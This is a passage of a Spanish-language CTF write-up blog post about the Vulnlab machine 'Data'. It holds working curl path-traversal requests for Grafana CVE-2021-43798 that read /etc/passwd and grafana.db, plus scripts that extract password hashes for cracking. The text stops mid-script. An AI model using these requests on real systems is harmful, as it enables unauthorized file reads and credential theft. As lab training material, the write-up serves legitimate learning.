@@ -1,0 +1,666 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Vulnlab - Data | MiguelRega7 - blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="Vulnlab - Data" />
+<meta name="author" content="MiguelRega7" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<link rel="canonical" href="http://localhost:4000/vulnlab/machines/2024/03/24/data.html" />
+<meta property="og:url" content="http://localhost:4000/vulnlab/machines/2024/03/24/data.html" />
+<meta property="og:site_name" content="MiguelRega7 - blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-03-24T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Vulnlab - Data" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-03-24T00:00:00-06:00","datePublished":"2024-03-24T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"Vulnlab - Data","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/vulnlab/machines/2024/03/24/data.html"},"url":"http://localhost:4000/vulnlab/machines/2024/03/24/data.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Vulnlab - Data</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2024-03-24T00:00:00-06:00" itemprop="datePublished">
+        Mar 24, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p align="center">
+<img src="/assets/vulnlab/img/machines/data/icon.png" />
+</p>
+
+<ul>
+  <li>En este post vamos a estar haciendo la máquina Data de la plataforma de Vulnlab es una máquina linux donde estaremos explotando el CVE-2021-43798 de Grafana en el cual podremos leer archivos gracias al LFI y asi podremos obtener un .db para poder ver los hashes de los usuarios y crackearlos para la escalada de privilegios abusaremos de un privilegio a nivel de sudoers con él podemos ejecutar docker exec y estaremos como root después crearemos una montura para poder ver la flag del usuario root.</li>
+</ul>
+
+<h2 id="portscan">PortScan</h2>
+
+<ul>
+  <li>Vamos a empezar escaneando los puertos abiertos por el protocolo <strong>TCP</strong> y sus tecnologías que corren en esos puertos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,3000 10.10.86.89 <span class="nt">-oN</span> targeted
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-02-26 10:36 CST
+Nmap scan report <span class="k">for </span>10.10.86.89
+Host is up <span class="o">(</span>0.19s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   2048 f7:80:11:6b:7e:c6:6c:f8:40:a8:04:65:96:ea:9a:81 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 ed:5b:de:89:e0:13:46:02:af:49:f6:7a:a2:dd:4f:fc <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 69:08:62:31:2d:ba:ce:41:b5:d9:5c:d8:d3:b9:ef:be <span class="o">(</span>ED25519<span class="o">)</span>
+3000/tcp open  ppp?
+| fingerprint-strings:
+|   FourOhFourRequest:
+|     HTTP/1.0 302 Found
+|     Cache-Control: no-cache
+|     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+|     Expires: <span class="nt">-1</span>
+|     Location: /login
+|     Pragma: no-cache
+|     Set-Cookie: <span class="nv">redirect_to</span><span class="o">=</span>%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> HttpOnly<span class="p">;</span> <span class="nv">SameSite</span><span class="o">=</span>Lax
+|     X-Content-Type-Options: nosniff
+|     X-Frame-Options: deny
+|     X-Xss-Protection: 1<span class="p">;</span> <span class="nv">mode</span><span class="o">=</span>block
+|     Date: Mon, 26 Feb 2024 16:37:42 GMT
+|     Content-Length: 29
+|     <span class="nv">href</span><span class="o">=</span><span class="s2">"/login"</span><span class="o">&gt;</span>Found&lt;/a&gt;.
+|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+|     Connection: close
+|     Request
+|   GetRequest:
+|     HTTP/1.0 302 Found
+|     Cache-Control: no-cache
+|     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+|     Expires: <span class="nt">-1</span>
+|     Location: /login
+|     Pragma: no-cache
+|     Set-Cookie: <span class="nv">redirect_to</span><span class="o">=</span>%2F<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> HttpOnly<span class="p">;</span> <span class="nv">SameSite</span><span class="o">=</span>Lax
+|     X-Content-Type-Options: nosniff
+|     X-Frame-Options: deny
+|     X-Xss-Protection: 1<span class="p">;</span> <span class="nv">mode</span><span class="o">=</span>block
+|     Date: Mon, 26 Feb 2024 16:37:08 GMT
+|     Content-Length: 29
+|     <span class="nv">href</span><span class="o">=</span><span class="s2">"/login"</span><span class="o">&gt;</span>Found&lt;/a&gt;.
+|   HTTPOptions:
+|     HTTP/1.0 302 Found
+|     Cache-Control: no-cache
+|     Expires: <span class="nt">-1</span>
+|     Location: /login
+|     Pragma: no-cache
+|     Set-Cookie: <span class="nv">redirect_to</span><span class="o">=</span>%2F<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> HttpOnly<span class="p">;</span> <span class="nv">SameSite</span><span class="o">=</span>Lax
+|     X-Content-Type-Options: nosniff
+|     X-Frame-Options: deny
+|     X-Xss-Protection: 1<span class="p">;</span> <span class="nv">mode</span><span class="o">=</span>block
+|     Date: Mon, 26 Feb 2024 16:37:14 GMT
+|_    Content-Length: 0
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port3000-TCP:V<span class="o">=</span>7.94SVN%I<span class="o">=</span>7%D<span class="o">=</span>2/26%Time<span class="o">=</span>65DCBE34%P<span class="o">=</span>x86_64-pc-linux-gnu%r
+SF:<span class="o">(</span>GenericLines,67,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20400</span><span class="se">\x</span><span class="s2">20Bad</span><span class="se">\x</span><span class="s2">20Request</span><span class="se">\r\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">
+SF:20text/plain;</span><span class="se">\x</span><span class="s2">20charset=utf-8</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20close</span><span class="se">\r\n\r\n</span><span class="s2">400</span><span class="se">\x</span><span class="s2">20Ba
+SF:d</span><span class="se">\x</span><span class="s2">20Request"</span><span class="o">)</span>%r<span class="o">(</span>GetRequest,174,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\x</span><span class="s2">20302</span><span class="se">\x</span><span class="s2">20Found</span><span class="se">\r\n</span><span class="s2">Cache-Con
+SF:trol:</span><span class="se">\x</span><span class="s2">20no-cache</span><span class="se">\r\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20text/html;</span><span class="se">\x</span><span class="s2">20charset=utf-8</span><span class="se">\r\n</span><span class="s2">Ex
+SF:pires:</span><span class="se">\x</span><span class="s2">20-1</span><span class="se">\r\n</span><span class="s2">Location:</span><span class="se">\x</span><span class="s2">20/login</span><span class="se">\r\n</span><span class="s2">Pragma:</span><span class="se">\x</span><span class="s2">20no-cache</span><span class="se">\r\n</span><span class="s2">Set-Cooki
+SF:e:</span><span class="se">\x</span><span class="s2">20redirect_to=%2F;</span><span class="se">\x</span><span class="s2">20Path=/;</span><span class="se">\x</span><span class="s2">20HttpOnly;</span><span class="se">\x</span><span class="s2">20SameSite=Lax</span><span class="se">\r\n</span><span class="s2">X-Con
+SF:tent-Type-Options:</span><span class="se">\x</span><span class="s2">20nosniff</span><span class="se">\r\n</span><span class="s2">X-Frame-Options:</span><span class="se">\x</span><span class="s2">20deny</span><span class="se">\r\n</span><span class="s2">X-Xss-Prot
+SF:ection:</span><span class="se">\x</span><span class="s2">201;</span><span class="se">\x</span><span class="s2">20mode=block</span><span class="se">\r\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20Mon,</span><span class="se">\x</span><span class="s2">2026</span><span class="se">\x</span><span class="s2">20Feb</span><span class="se">\x</span><span class="s2">202024</span><span class="se">\x</span><span class="s2">2016
+SF::37:08</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">2029</span><span class="se">\r\n\r\n</span><span class="s2">&lt;a</span><span class="se">\x</span><span class="s2">20href=</span><span class="se">\"</span><span class="s2">/login</span><span class="se">\"</span><span class="s2">&gt;Fou
+SF:nd&lt;/a&gt;</span><span class="se">\.\n\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>Help,67,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20400</span><span class="se">\x</span><span class="s2">20Bad</span><span class="se">\x</span><span class="s2">20Request</span><span class="se">\r\n</span><span class="s2">Content
+SF:-Type:</span><span class="se">\x</span><span class="s2">20text/plain;</span><span class="se">\x</span><span class="s2">20charset=utf-8</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20close</span><span class="se">\r\n\r\n</span><span class="s2">4
+SF:00</span><span class="se">\x</span><span class="s2">20Bad</span><span class="se">\x</span><span class="s2">20Request"</span><span class="o">)</span>%r<span class="o">(</span>HTTPOptions,12E,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\x</span><span class="s2">20302</span><span class="se">\x</span><span class="s2">20Found</span><span class="se">\r\n</span><span class="s2">
+SF:Cache-Control:</span><span class="se">\x</span><span class="s2">20no-cache</span><span class="se">\r\n</span><span class="s2">Expires:</span><span class="se">\x</span><span class="s2">20-1</span><span class="se">\r\n</span><span class="s2">Location:</span><span class="se">\x</span><span class="s2">20/login</span><span class="se">\r\n</span><span class="s2">
+SF:Pragma:</span><span class="se">\x</span><span class="s2">20no-cache</span><span class="se">\r\n</span><span class="s2">Set-Cookie:</span><span class="se">\x</span><span class="s2">20redirect_to=%2F;</span><span class="se">\x</span><span class="s2">20Path=/;</span><span class="se">\x</span><span class="s2">20Ht
+SF:tpOnly;</span><span class="se">\x</span><span class="s2">20SameSite=Lax</span><span class="se">\r\n</span><span class="s2">X-Content-Type-Options:</span><span class="se">\x</span><span class="s2">20nosniff</span><span class="se">\r\n</span><span class="s2">X-Fram
+SF:e-Options:</span><span class="se">\x</span><span class="s2">20deny</span><span class="se">\r\n</span><span class="s2">X-Xss-Protection:</span><span class="se">\x</span><span class="s2">201;</span><span class="se">\x</span><span class="s2">20mode=block</span><span class="se">\r\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">2
+SF:0Mon,</span><span class="se">\x</span><span class="s2">2026</span><span class="se">\x</span><span class="s2">20Feb</span><span class="se">\x</span><span class="s2">202024</span><span class="se">\x</span><span class="s2">2016:37:14</span><span class="se">\x</span><span class="s2">20GMT</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">200</span><span class="se">\r</span><span class="s2">
+SF:</span><span class="se">\n\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>RTSPRequest,67,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20400</span><span class="se">\x</span><span class="s2">20Bad</span><span class="se">\x</span><span class="s2">20Request</span><span class="se">\r\n</span><span class="s2">Conten
+SF:t-Type:</span><span class="se">\x</span><span class="s2">20text/plain;</span><span class="se">\x</span><span class="s2">20charset=utf-8</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20close</span><span class="se">\r\n\r\n</span><span class="s2">
+SF:400</span><span class="se">\x</span><span class="s2">20Bad</span><span class="se">\x</span><span class="s2">20Request"</span><span class="o">)</span>%r<span class="o">(</span>SSLSessionReq,67,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20400</span><span class="se">\x</span><span class="s2">20Bad</span><span class="se">\x</span><span class="s2">20
+SF:Request</span><span class="se">\r\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20text/plain;</span><span class="se">\x</span><span class="s2">20charset=utf-8</span><span class="se">\r\n</span><span class="s2">Connection:
+SF:</span><span class="se">\x</span><span class="s2">20close</span><span class="se">\r\n\r\n</span><span class="s2">400</span><span class="se">\x</span><span class="s2">20Bad</span><span class="se">\x</span><span class="s2">20Request"</span><span class="o">)</span>%r<span class="o">(</span>TerminalServerCookie,67,<span class="s2">"HTT
+SF:P/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20400</span><span class="se">\x</span><span class="s2">20Bad</span><span class="se">\x</span><span class="s2">20Request</span><span class="se">\r\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20text/plain;</span><span class="se">\x</span><span class="s2">20char
+SF:set=utf-8</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20close</span><span class="se">\r\n\r\n</span><span class="s2">400</span><span class="se">\x</span><span class="s2">20Bad</span><span class="se">\x</span><span class="s2">20Request"</span><span class="o">)</span>%r<span class="o">(</span>TLSS
+SF:essionReq,67,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20400</span><span class="se">\x</span><span class="s2">20Bad</span><span class="se">\x</span><span class="s2">20Request</span><span class="se">\r\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20te
+SF:xt/plain;</span><span class="se">\x</span><span class="s2">20charset=utf-8</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20close</span><span class="se">\r\n\r\n</span><span class="s2">400</span><span class="se">\x</span><span class="s2">20Bad</span><span class="se">\x</span><span class="s2">2
+SF:0Request"</span><span class="o">)</span>%r<span class="o">(</span>Kerberos,67,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20400</span><span class="se">\x</span><span class="s2">20Bad</span><span class="se">\x</span><span class="s2">20Request</span><span class="se">\r\n</span><span class="s2">Content
+SF:-Type:</span><span class="se">\x</span><span class="s2">20text/plain;</span><span class="se">\x</span><span class="s2">20charset=utf-8</span><span class="se">\r\n</span><span class="s2">Connection:</span><span class="se">\x</span><span class="s2">20close</span><span class="se">\r\n\r\n</span><span class="s2">4
+SF:00</span><span class="se">\x</span><span class="s2">20Bad</span><span class="se">\x</span><span class="s2">20Request"</span><span class="o">)</span>%r<span class="o">(</span>FourOhFourRequest,1A1,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\x</span><span class="s2">20302</span><span class="se">\x</span><span class="s2">20Fou
+SF:nd</span><span class="se">\r\n</span><span class="s2">Cache-Control:</span><span class="se">\x</span><span class="s2">20no-cache</span><span class="se">\r\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20text/html;</span><span class="se">\x</span><span class="s2">20char
+SF:set=utf-8</span><span class="se">\r\n</span><span class="s2">Expires:</span><span class="se">\x</span><span class="s2">20-1</span><span class="se">\r\n</span><span class="s2">Location:</span><span class="se">\x</span><span class="s2">20/login</span><span class="se">\r\n</span><span class="s2">Pragma:</span><span class="se">\x</span><span class="s2">20no-cac
+SF:he</span><span class="se">\r\n</span><span class="s2">Set-Cookie:</span><span class="se">\x</span><span class="s2">20redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity</span><span class="se">\.</span><span class="s2">
+SF:txt%252ebak;</span><span class="se">\x</span><span class="s2">20Path=/;</span><span class="se">\x</span><span class="s2">20HttpOnly;</span><span class="se">\x</span><span class="s2">20SameSite=Lax</span><span class="se">\r\n</span><span class="s2">X-Content-Type-
+SF:Options:</span><span class="se">\x</span><span class="s2">20nosniff</span><span class="se">\r\n</span><span class="s2">X-Frame-Options:</span><span class="se">\x</span><span class="s2">20deny</span><span class="se">\r\n</span><span class="s2">X-Xss-Protection:</span><span class="se">\x</span><span class="s2">2
+SF:01;</span><span class="se">\x</span><span class="s2">20mode=block</span><span class="se">\r\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20Mon,</span><span class="se">\x</span><span class="s2">2026</span><span class="se">\x</span><span class="s2">20Feb</span><span class="se">\x</span><span class="s2">202024</span><span class="se">\x</span><span class="s2">2016:37:42</span><span class="se">\x</span><span class="s2">20
+SF:GMT</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">2029</span><span class="se">\r\n\r\n</span><span class="s2">&lt;a</span><span class="se">\x</span><span class="s2">20href=</span><span class="se">\"</span><span class="s2">/login</span><span class="se">\"</span><span class="s2">&gt;Found&lt;/a&gt;</span><span class="se">\.\n</span><span class="s2">
+SF:</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<h2 id="grafana-cve-2021-43798">Grafana CVE-2021-43798</h2>
+
+<ul>
+  <li>Pues bueno, vemos que nos redirige a un panel de login que como tal está corriendo <strong>Grafana</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap curl <span class="nt">-s</span> <span class="nt">-I</span> http://10.10.86.89:3000
+HTTP/1.1 302 Found
+Cache-Control: no-cache
+Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+Expires: <span class="nt">-1</span>
+Location: /login
+Pragma: no-cache
+Set-Cookie: <span class="nv">redirect_to</span><span class="o">=</span>%2F<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> HttpOnly<span class="p">;</span> <span class="nv">SameSite</span><span class="o">=</span>Lax
+X-Content-Type-Options: nosniff
+X-Frame-Options: deny
+X-Xss-Protection: 1<span class="p">;</span> <span class="nv">mode</span><span class="o">=</span>block
+Date: Mon, 26 Feb 2024 16:40:00 GMT
+
+➜  nmap whatweb http://10.10.86.89:3000/login
+http://10.10.86.89:3000/login <span class="o">[</span>200 OK] Country[RESERVED][ZZ], Grafana[8.0.0], HTML5, IP[10.10.86.89], Script[text/javascript], Title[Grafana], UncommonHeaders[x-content-type-options], X-Frame-Options[deny], X-UA-Compatible[IE<span class="o">=</span>edge], X-XSS-Protection[1<span class="p">;</span> <span class="nv">mode</span><span class="o">=</span>block]
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos la versión que está empleando <strong>Grafana</strong>.</li>
+</ul>
+
+<p align="center">
+<img src="https://i.imgur.com/IO2lTsI.png" />
+</p>
+
+<ul>
+  <li>Si empleamos las credenciales por defecto aun así no funcionan.</li>
+</ul>
+
+<p align="center">
+<img src="https://i.imgur.com/twqbdcY.png" />
+</p>
+
+<ul>
+  <li>Si buscamos vulnerabilidades encontramos un <strong>Directory Traversal and Arbitrary File Read</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap searchsploit grafana 8
+<span class="nt">-----------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                                                                                   |  Path
+<span class="nt">-----------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Grafana 7.0.1 - Denial of Service <span class="o">(</span>PoC<span class="o">)</span>                                                                          | linux/dos/48638.sh
+Grafana 8.3.0 - Directory Traversal and Arbitrary File Read                                                      | multiple/webapps/50581.py
+Grafana &lt;<span class="o">=</span>6.2.4 - HTML Injection                                                                                 | typescript/webapps/51073.txt
+<span class="nt">-----------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Shellcodes: No Results
+</code></pre></div></div>
+
+<ul>
+  <li>Si inspeccionamos el script vemos como funciona la vulnerabilidad.</li>
+</ul>
+
+<p align="center">
+<img src="https://i.imgur.com/CTYKQBF.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Si buscamos vulnerabilidades vemos que como tal si existe la vulnerabilidad y podemos explotarla <a href="https://pentest-tools.com/vulnerabilities-exploits/grafana-v8x-arbitrary-file-read_2187">https://pentest-tools.com/vulnerabilities-exploits/grafana-v8x-arbitrary-file-read_2187</a> .</p>
+  </li>
+  <li>
+    <p>Aquí nos dicen como funciona <a href="https://github.com/taythebot/CVE-2021-43798">https://github.com/taythebot/CVE-2021-43798</a>.</p>
+  </li>
+  <li>
+    <p>Si enviamos una petición con el método <strong>GET</strong> vemos que obtenemos el <strong>/etc/passwd</strong> .</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap curl <span class="nt">--path-as-is</span> http://10.10.86.89:3000/public/plugins/alertlist/../../../../../../../../etc/passwd
+root:x:0:0:root:/root:/bin/ash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+<span class="nb">sync</span>:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+man:x:13:15:man:/usr/man:/sbin/nologin
+postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
+cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
+squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
+xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
+games:x:35:35:games:/usr/games:/sbin/nologin
+cyrus:x:85:12::/usr/cyrus:/sbin/nologin
+vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
+ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
+guest:x:405:100:guest:/dev/null:/sbin/nologin
+nobody:x:65534:65534:nobody:/:/sbin/nologin
+grafana:x:472:0:Linux User,,,:/home/grafana:/sbin/nologin
+➜  nmap
+</code></pre></div></div>
+
+<ul>
+  <li>En el repositorio de <strong>GitHub</strong> nos hablan de que podemos obtener el archivo <strong>grafana.db</strong> vamos a descargarlo empleando <strong>curl</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content curl <span class="nt">-s</span> <span class="nt">-o</span> grafana.db <span class="nt">--path-as-is</span> http://10.10.86.89:3000/public/plugins/welcome/../../../../../../../../var/lib/grafana/grafana.db
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a abrir él <strong>.db</strong> para inspeccionarlo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content sqlitebrowser grafana.db
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos los hashes de 2 usuarios.</li>
+</ul>
+
+<p align="center">
+<img src="https://i.imgur.com/9w7FxF9.png" />
+</p>
+
+<ul>
+  <li>Los <strong>Hashes</strong> usan <strong>PBKDF2-HMAC-SHA256</strong> <a href="https://github.com/iamaldi/grafana2hashcat/blob/main/README.md">https://github.com/iamaldi/grafana2hashcat/blob/main/README.md</a>.</li>
+</ul>
+
+<p align="center">
+<img src="https://i.imgur.com/NX58ccV.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Pero aun así podemos crackearlos con <strong>Hashcat</strong> <a href="https://vulncheck.com/blog/grafana-cve-2021-43798">https://vulncheck.com/blog/grafana-cve-2021-43798</a>, solamente necesitamos transformar los <strong>hashes</strong>.</p>
+  </li>
+  <li>
+    <p>Nos dan un script de <strong>go</strong> para generar un formato de hash correcto.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// grab the usernames, passwords and salts from the downloaded db
+rows, err :<span class="o">=</span> db.Query<span class="o">(</span><span class="s2">"select email,password,salt,is_admin from user"</span><span class="o">)</span>
+<span class="k">if </span>err <span class="o">!=</span> nil <span class="o">{</span>
+    <span class="k">return</span>
+<span class="o">}</span>
+defer rows.Close<span class="o">()</span>
+
+<span class="k">for </span>rows.Next<span class="o">()</span> <span class="o">{</span>
+    var email string
+    var password string
+    var salt string
+    err <span class="o">=</span> rows.Scan<span class="o">(</span>&amp;email, &amp;password, &amp;salt<span class="o">)</span>
+    <span class="k">if </span>err <span class="o">!=</span> nil <span class="o">{</span>
+     <span class="k">return </span><span class="nb">false</span>
+    <span class="o">}</span>
+
+    decoded_hash, _ :<span class="o">=</span> hex.DecodeString<span class="o">(</span>password<span class="o">)</span>
+    hash64 :<span class="o">=</span> b64.StdEncoding.EncodeToString<span class="o">([]</span>byte<span class="o">(</span>decoded_hash<span class="o">))</span>
+    salt64 :<span class="o">=</span> b64.StdEncoding.EncodeToString<span class="o">([]</span>byte<span class="o">(</span>salt<span class="o">))</span>
+    _, _ <span class="o">=</span> hash_file.WriteString<span class="o">(</span><span class="s2">"sha256:10000:"</span> + salt64 + <span class="s2">":"</span> + hash64 + <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Pero podemos crear un script en <strong>Python3</strong> que haga lo mismo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  exploits <span class="nb">cat </span>gethash.py
+<span class="c">#!/usr/bin/env python3</span>
+
+import sqlite3
+import <span class="nb">base64
+</span>import hashlib
+
+<span class="c"># Nos conectamos</span>
+conn <span class="o">=</span> sqlite3.connect<span class="o">(</span><span class="s1">'grafana.db'</span><span class="o">)</span>
+cursor <span class="o">=</span> conn.cursor<span class="o">()</span>
+
+<span class="c"># Filtramos directamente por la data que nos interesa</span>
+cursor.execute<span class="o">(</span><span class="s2">"SELECT email, password, salt, is_admin FROM user"</span><span class="o">)</span>
+
+<span class="c"># Obtenemos todas las filas</span>
+rows <span class="o">=</span> cursor.fetchall<span class="o">()</span>
+
+<span class="c"># Recorremos las filas con un bucle for</span>
+<span class="k">for </span>row <span class="k">in </span>rows:
+    email, password, salt, is_admin <span class="o">=</span> row
+
+    <span class="c"># Decodifimos la contraseña de hexadecimal</span>
+    decoded_hash <span class="o">=</span> bytes.fromhex<span class="o">(</span>password<span class="o">)</span>
+
+    <span class="c"># Codificamos la contraseña y la sal a base64</span>
+    hash64 <span class="o">=</span> base64.b64encode<span class="o">(</span>decoded_hash<span class="o">)</span>.decode<span class="o">(</span><span class="s1">'utf-8'</span><span class="o">)</span>
+    salt64 <span class="o">=</span> base64.b64encode<span class="o">(</span>salt.encode<span class="o">(</span><span class="s1">'utf-8'</span><span class="o">))</span>.decode<span class="o">(</span><span class="s1">'utf-8'</span><span class="o">)</span>
+
+    <span class="c"># Lo guardamos en un archivo hash_file.txt</span>
